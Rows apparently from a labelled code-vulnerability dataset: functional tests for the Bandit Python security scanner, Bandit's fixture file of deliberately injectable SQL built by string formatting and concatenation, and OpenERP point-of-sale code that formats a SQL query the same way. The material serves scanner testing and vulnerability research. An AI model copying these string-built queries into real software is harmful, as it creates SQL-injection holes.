        self.check_example('httpoxy_twisted_directory.py', expect)

    def test_asserts(self):
        '''Test catching the use of assert.'''
        expect = {'SEVERITY': {'LOW': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('assert.py', expect)

    def test_paramiko_injection(self):
        '''Test paramiko command execution.'''
        expect = {'SEVERITY': {'MEDIUM': 2},
                  'CONFIDENCE': {'MEDIUM': 2}}
        self.check_example('paramiko_injection.py', expect)

    def test_partial_path(self):
        '''Test process spawning with partial file paths.'''
        expect = {'SEVERITY': {'LOW': 11},
                  'CONFIDENCE': {'HIGH': 11}}

        self.check_example('partial_path_process.py', expect)

    def test_try_except_continue(self):
        '''Test try, except, continue detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                    if x.__name__ == 'try_except_continue'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_continue.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_continue.py', expect)

    def test_try_except_pass(self):
        '''Test try, except pass detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                     if x.__name__ == 'try_except_pass'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_pass.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_pass.py', expect)

    def test_metric_gathering(self):
        expect = {
            'nosec': 2, 'loc': 7,
            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}
        }
        self.check_metrics('skip.py', expect)
        expect = {
            'nosec': 0, 'loc': 4,
            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}
        }
        self.check_metrics('imports.py', expect)

    def test_weak_cryptographic_key(self):
        '''Test for weak key sizes.'''
        expect = {
            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},
            'CONFIDENCE': {'HIGH': 14}
        }
        self.check_example('weak_cryptographic_key_sizes.py', expect)

    def test_multiline_code(self):
        '''Test issues in multiline statements return code as expected.'''
        self.run_example('multiline_statement.py')
        self.assertEqual(0, len(self.b_mgr.skipped))
        self.assertEqual(1, len(self.b_mgr.files_list))
        self.assertTrue(self.b_mgr.files_list[0].endswith(
                        'multiline_statement.py'))

        issues = self.b_mgr.get_issue_list()
        self.assertEqual(2, len(issues))
        self.assertTrue(
            issues[0].fname.endswith('examples/multiline_statement.py')
        )

        self.assertEqual(1, issues[0].lineno)
        self.assertEqual(list(range(1, 3)), issues[0].linerange)
        self.assertIn('subprocess', issues[0].get_code())
        self.assertEqual(5, issues[1].lineno)
        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)
        self.assertIn('shell=True', issues[1].get_code())

    def test_code_line_numbers(self):
        self.run_example('binding.py')
        issues = self.b_mgr.get_issue_list()

        code_lines = issues[0].get_code().splitlines()
        lineno = issues[0].lineno
        self.assertEqual(""%i "" % (lineno - 1), code_lines[0][:2])
        self.assertEqual(""%i "" % (lineno), code_lines[1][:2])
        self.assertEqual(""%i "" % (lineno + 1), code_lines[2][:2])

    def test_flask_debug_true(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'MEDIUM': 1}
        }
        self.check_example('flask_debug.py', expect)

    def test_nosec(self):
        expect = {
            'SEVERITY': {},
            'CONFIDENCE': {}
        }
        self.check_example('nosec.py', expect)

    def test_baseline_filter(self):
        issue_text = ('A Flask app appears to be run with debug=True, which '
                      'exposes the Werkzeug debugger and allows the execution '
                      'of arbitrary code.')
        json = """"""{
          ""results"": [
            {
              ""code"": ""..."",
              ""filename"": ""%s/examples/flask_debug.py"",
              ""issue_confidence"": ""MEDIUM"",
              ""issue_severity"": ""HIGH"",
              ""issue_text"": ""%s"",
              ""line_number"": 10,
              ""line_range"": [
                10
              ],
              ""test_name"": ""flask_debug_true"",
              ""test_id"": ""B201""
            }
          ]
        }
        """""" % (os.getcwd(), issue_text)

        self.b_mgr.populate_baseline(json)
        self.run_example('flask_debug.py')
        self.assertEqual(1, len(self.b_mgr.baseline))
        self.assertEqual({}, self.b_mgr.get_issue_list())

    def test_blacklist_input(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'HIGH': 1}
        }
        self.check_example('input.py', expect)
/n/n/n",0,sql
13,27,6ce60806ca8a44d8a8b37050539e2b2f9a54b847,"/examples/sql_statements.py/n/nimport sqlalchemy

# bad
query = ""SELECT * FROM foo WHERE id = '%s'"" % identifier
query = ""INSERT INTO foo VALUES ('a', 'b', '%s')"" % value
query = ""DELETE FROM foo WHERE id = '%s'"" % identifier
query = ""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier
query = """"""WITH cte AS (SELECT x FROM foo)
SELECT x FROM cte WHERE x = '%s'"""""" % identifier

# bad
cur.execute(""SELECT * FROM foo WHERE id = '%s'"" % identifier)
cur.execute(""INSERT INTO foo VALUES ('a', 'b', '%s')"" % value)
cur.execute(""DELETE FROM foo WHERE id = '%s'"" % identifier)
cur.execute(""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier)

# good
cur.execute(""SELECT * FROM foo WHERE id = '%s'"", identifier)
cur.execute(""INSERT INTO foo VALUES ('a', 'b', '%s')"", value)
cur.execute(""DELETE FROM foo WHERE id = '%s'"", identifier)
cur.execute(""UPDATE foo SET value = 'b' WHERE id = '%s'"", identifier)

# bad
query = ""SELECT "" + val + "" FROM "" + val +"" WHERE id = "" + val

# bad
cur.execute(""SELECT "" + val + "" FROM "" + val +"" WHERE id = "" + val)


# bug: https://bugs.launchpad.net/bandit/+bug/1479625
def a():
    def b():
        pass
    return b

a()(""SELECT %s FROM foo"" % val)

# real world false positives
choices=[('server_list', _(""Select from active instances""))]
print(""delete from the cache as the first argument"")
/n/n/n/tests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-
#
# Copyright 2014 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import os

import six
import testtools

from bandit.core import config as b_config
from bandit.core import constants as C
from bandit.core import manager as b_manager
from bandit.core import metrics
from bandit.core import test_set as b_test_set


class FunctionalTests(testtools.TestCase):

    '''Functional tests for bandit test plugins.

    This set of tests runs bandit against each example file in turn
    and records the score returned. This is compared to a known good value.
    When new tests are added to an example the expected result should be
    adjusted to match.
    '''

    def setUp(self):
        super(FunctionalTests, self).setUp()
        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch
        # them up here for the testing environment.
        #
        path = os.path.join(os.getcwd(), 'bandit', 'plugins')
        b_conf = b_config.BanditConfig()
        self.b_mgr = b_manager.BanditManager(b_conf, 'file')
        self.b_mgr.b_conf._settings['plugins_dir'] = path
        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)

    def run_example(self, example_script, ignore_nosec=False):
        '''A helper method to run the specified test

        This method runs the test, which populates the self.b_mgr.scores
        value. Call this directly if you need to run a test, but do not
        need to test the resulting scores against specified values.
        :param example_script: Filename of an example script to test
        '''
        path = os.path.join(os.getcwd(), 'examples', example_script)
        self.b_mgr.ignore_nosec = ignore_nosec
        self.b_mgr.discover_files([path], True)
        self.b_mgr.run_tests()

    def check_example(self, example_script, expect, ignore_nosec=False):
        '''A helper method to test the scores for example scripts.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected counts of issue types
        '''
        # reset scores for subsequent calls to check_example
        self.b_mgr.scores = []
        self.run_example(example_script, ignore_nosec=ignore_nosec)
        expected = 0
        result = 0
        for test_scores in self.b_mgr.scores:
            for score_type in test_scores:
                self.assertIn(score_type, expect)
                for rating in expect[score_type]:
                    expected += (
                        expect[score_type][rating] * C.RANKING_VALUES[rating]
                    )
                result += sum(test_scores[score_type])
        self.assertEqual(expected, result)

    def check_metrics(self, example_script, expect):
        '''A helper method to test the metrics being returned.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected values of metrics
        '''
        self.b_mgr.metrics = metrics.Metrics()
        self.b_mgr.scores = []
        self.run_example(example_script)

        # test general metrics (excludes issue counts)
        m = self.b_mgr.metrics.data
        for k in expect:
            if k != 'issues':
                self.assertEqual(expect[k], m['_totals'][k])
        # test issue counts
        if 'issues' in expect:
            for (criteria, default) in C.CRITERIA:
                for rank in C.RANKING:
                    label = '{0}.{1}'.format(criteria, rank)
                    expected = 0
                    if expect['issues'].get(criteria, None).get(rank, None):
                        expected = expect['issues'][criteria][rank]
                    self.assertEqual(expected, m['_totals'][label])

    def test_binding(self):
        '''Test the bind-to-0.0.0.0 example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}
        self.check_example('binding.py', expect)

    def test_crypto_md5(self):
        '''Test the `hashlib.md5` example.'''
        expect = {'SEVERITY': {'MEDIUM': 11},
                  'CONFIDENCE': {'HIGH': 11}}
        self.check_example('crypto-md5.py', expect)

    def test_ciphers(self):
        '''Test the `Crypto.Cipher` example.'''
        expect = {'SEVERITY': {'HIGH': 13},
                  'CONFIDENCE': {'HIGH': 13}}
        self.check_example('ciphers.py', expect)

    def test_cipher_modes(self):
        '''Test for insecure cipher modes.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('cipher-modes.py', expect)

    def test_eval(self):
        '''Test the `eval` example.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('eval.py', expect)

    def test_mark_safe(self):
        '''Test the `mark_safe` example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('mark_safe.py', expect)

    def test_exec(self):
        '''Test the `exec` example.'''
        filename = 'exec-{}.py'
        if six.PY2:
            filename = filename.format('py2')
            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}
        else:
            filename = filename.format('py3')
            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example(filename, expect)

    def test_exec_as_root(self):
        '''Test for the `run_as_root=True` keyword argument.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}
        self.check_example('exec-as-root.py', expect)

    def test_hardcoded_passwords(self):
        '''Test for hard-coded passwords.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}
        self.check_example('hardcoded-passwords.py', expect)

    def test_hardcoded_tmp(self):
        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('hardcoded-tmp.py', expect)

    def test_httplib_https(self):
        '''Test for `httplib.HTTPSConnection`.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('httplib_https.py', expect)

    def test_imports_aliases(self):
        '''Test the `import X as Y` syntax.'''
        expect = {
            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},
            'CONFIDENCE': {'HIGH': 9}
        }
        self.check_example('imports-aliases.py', expect)

    def test_imports_from(self):
        '''Test the `from X import Y` syntax.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('imports-from.py', expect)

    def test_imports_function(self):
        '''Test the `__import__` function.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports-function.py', expect)

    def test_telnet_usage(self):
        '''Test for `import telnetlib` and Telnet.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('telnetlib.py', expect)

    def test_ftp_usage(self):
        '''Test for `import ftplib` and FTP.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('ftplib.py', expect)

    def test_imports(self):
        '''Test for dangerous imports.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports.py', expect)

    def test_mktemp(self):
        '''Test for `tempfile.mktemp`.'''
        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}
        self.check_example('mktemp.py', expect)

    def test_nonsense(self):
        '''Test that a syntactically invalid module is skipped.'''
        self.run_example('nonsense.py')
        self.assertEqual(1, len(self.b_mgr.skipped))

    def test_okay(self):
        '''Test a vulnerability-free file.'''
        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}
        self.check_example('okay.py', expect)

    def test_os_chmod(self):
        '''Test setting file permissions.'''
        filename = 'os-chmod-{}.py'
        if six.PY2:
            filename = filename.format('py2')
        else:
            filename = filename.format('py3')
        expect = {
            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},
            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}
        }
        self.check_example(filename, expect)

    def test_os_exec(self):
        '''Test for `os.exec*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-exec.py', expect)

    def test_os_popen(self):
        '''Test for `os.popen`.'''
        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 9}}
        self.check_example('os-popen.py', expect)

    def test_os_spawn(self):
        '''Test for `os.spawn*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-spawn.py', expect)

    def test_os_startfile(self):
        '''Test for `os.startfile`.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('os-startfile.py', expect)

    def test_os_system(self):
        '''Test for `os.system`.'''
        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('os_system.py', expect)

    def test_pickle(self):
        '''Test for the `pickle` module.'''
        expect = {
            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},
            'CONFIDENCE': {'HIGH': 8}
        }
        self.check_example('pickle_deserialize.py', expect)

    def test_popen_wrappers(self):
        '''Test the `popen2` and `commands` modules.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('popen_wrappers.py', expect)

    def test_random_module(self):
        '''Test for the `random` module.'''
        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}
        self.check_example('random_module.py', expect)

    def test_requests_ssl_verify_disabled(self):
        '''Test for the `requests` library skipping verification.'''
        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('requests-ssl-verify-disabled.py', expect)

    def test_skip(self):
        '''Test `#nosec` and `#noqa` comments.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}
        self.check_example('skip.py', expect)

    def test_ignore_skip(self):
        '''Test --ignore-nosec flag.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('skip.py', expect, ignore_nosec=True)

    def test_sql_statements(self):
        '''Test for SQL injection through string building.'''
        expect = {
            'SEVERITY': {'MEDIUM': 12},
            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}
        self.check_example('sql_statements.py', expect)

    def test_ssl_insecure_version(self):
        '''Test for insecure SSL protocol versions.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},
            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}
        }
        self.check_example('ssl-insecure-version.py', expect)

    def test_subprocess_shell(self):
        '''Test for `subprocess.Popen` with `shell=True`.'''
        expect = {
            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},
            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}
        }
        self.check_example('subprocess_shell.py', expect)

    def test_urlopen(self):
        '''Test for dangerous URL opening.'''
        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}
        self.check_example('urlopen.py', expect)

    def test_utils_shell(self):
        '''Test for `utils.execute*` with `shell=True`.'''
        expect = {
            'SEVERITY': {'LOW': 5},
            'CONFIDENCE': {'HIGH': 5}
        }
        self.check_example('utils-shell.py', expect)

    def test_wildcard_injection(self):
        '''Test for wildcard injection in shell commands.'''
        expect = {
            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},
            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}
        }
        self.check_example('wildcard-injection.py', expect)

    def test_yaml(self):
        '''Test for `yaml.load`.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('yaml_load.py', expect)

    def test_jinja2_templating(self):
        '''Test jinja templating for potential XSS bugs.'''
        expect = {
            'SEVERITY': {'HIGH': 4},
            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}
        }
        self.check_example('jinja2_templating.py', expect)

    def test_secret_config_option(self):
        '''Test for `secret=True` in Oslo's config.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},
            'CONFIDENCE': {'MEDIUM': 3}
        }
        self.check_example('secret-config-option.py', expect)

    def test_mako_templating(self):
        '''Test Mako templates for XSS.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('mako_templating.py', expect)

    def test_xml(self):
        '''Test xml vulnerabilities.'''
        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_celementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}
        self.check_example('xml_expatbuilder.py', expect)

        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}
        self.check_example('xml_lxml.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_pulldom.py', expect)

        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('xml_xmlrpc.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_elementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}
        self.check_example('xml_expatreader.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_minidom.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}
        self.check_example('xml_sax.py', expect)

    def test_httpoxy(self):
        '''Test httpoxy vulnerability.'''
        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('httpoxy_cgihandler.py', expect)
        self.check_example('httpoxy_twisted_script.py', expect)
        self.check_example('httpoxy_twisted_directory.py', expect)

    def test_asserts(self):
        '''Test catching the use of assert.'''
        expect = {'SEVERITY': {'LOW': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('assert.py', expect)

    def test_paramiko_injection(self):
        '''Test paramiko command execution.'''
        expect = {'SEVERITY': {'MEDIUM': 2},
                  'CONFIDENCE': {'MEDIUM': 2}}
        self.check_example('paramiko_injection.py', expect)

    def test_partial_path(self):
        '''Test process spawning with partial file paths.'''
        expect = {'SEVERITY': {'LOW': 11},
                  'CONFIDENCE': {'HIGH': 11}}

        self.check_example('partial_path_process.py', expect)

    def test_try_except_continue(self):
        '''Test try, except, continue detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                    if x.__name__ == 'try_except_continue'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_continue.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_continue.py', expect)

    def test_try_except_pass(self):
        '''Test try, except pass detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                     if x.__name__ == 'try_except_pass'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_pass.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_pass.py', expect)

    def test_metric_gathering(self):
        expect = {
            'nosec': 2, 'loc': 7,
            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}
        }
        self.check_metrics('skip.py', expect)
        expect = {
            'nosec': 0, 'loc': 4,
            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}
        }
        self.check_metrics('imports.py', expect)

    def test_weak_cryptographic_key(self):
        '''Test for weak key sizes.'''
        expect = {
            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},
            'CONFIDENCE': {'HIGH': 14}
        }
        self.check_example('weak_cryptographic_key_sizes.py', expect)

    def test_multiline_code(self):
        '''Test issues in multiline statements return code as expected.'''
        self.run_example('multiline_statement.py')
        self.assertEqual(0, len(self.b_mgr.skipped))
        self.assertEqual(1, len(self.b_mgr.files_list))
        self.assertTrue(self.b_mgr.files_list[0].endswith(
                        'multiline_statement.py'))

        issues = self.b_mgr.get_issue_list()
        self.assertEqual(2, len(issues))
        self.assertTrue(
            issues[0].fname.endswith('examples/multiline_statement.py')
        )

        self.assertEqual(1, issues[0].lineno)
        self.assertEqual(list(range(1, 3)), issues[0].linerange)
        self.assertIn('subprocess', issues[0].get_code())
        self.assertEqual(5, issues[1].lineno)
        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)
        self.assertIn('shell=True', issues[1].get_code())

    def test_code_line_numbers(self):
        self.run_example('binding.py')
        issues = self.b_mgr.get_issue_list()

        code_lines = issues[0].get_code().splitlines()
        lineno = issues[0].lineno
        self.assertEqual(""%i "" % (lineno - 1), code_lines[0][:2])
        self.assertEqual(""%i "" % (lineno), code_lines[1][:2])
        self.assertEqual(""%i "" % (lineno + 1), code_lines[2][:2])

    def test_flask_debug_true(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'MEDIUM': 1}
        }
        self.check_example('flask_debug.py', expect)

    def test_nosec(self):
        expect = {
            'SEVERITY': {},
            'CONFIDENCE': {}
        }
        self.check_example('nosec.py', expect)

    def test_baseline_filter(self):
        issue_text = ('A Flask app appears to be run with debug=True, which '
                      'exposes the Werkzeug debugger and allows the execution '
                      'of arbitrary code.')
        json = """"""{
          ""results"": [
            {
              ""code"": ""..."",
              ""filename"": ""%s/examples/flask_debug.py"",
              ""issue_confidence"": ""MEDIUM"",
              ""issue_severity"": ""HIGH"",
              ""issue_text"": ""%s"",
              ""line_number"": 10,
              ""line_range"": [
                10
              ],
              ""test_name"": ""flask_debug_true"",
              ""test_id"": ""B201""
            }
          ]
        }
        """""" % (os.getcwd(), issue_text)

        self.b_mgr.populate_baseline(json)
        self.run_example('flask_debug.py')
        self.assertEqual(1, len(self.b_mgr.baseline))
        self.assertEqual({}, self.b_mgr.get_issue_list())

    def test_blacklist_input(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'HIGH': 1}
        }
        self.check_example('input.py', expect)
/n/n/n",1,sql
14,38,b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c,"addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """"""
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """"""
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': ""[('id','in',"" + str(list_statement) + "")]"",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """"""
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """"""
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for ""%s"". \n Please close the cashbox related to. ' %(journal.name)))
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

        data_obj = self.pool.get('ir.model.data')
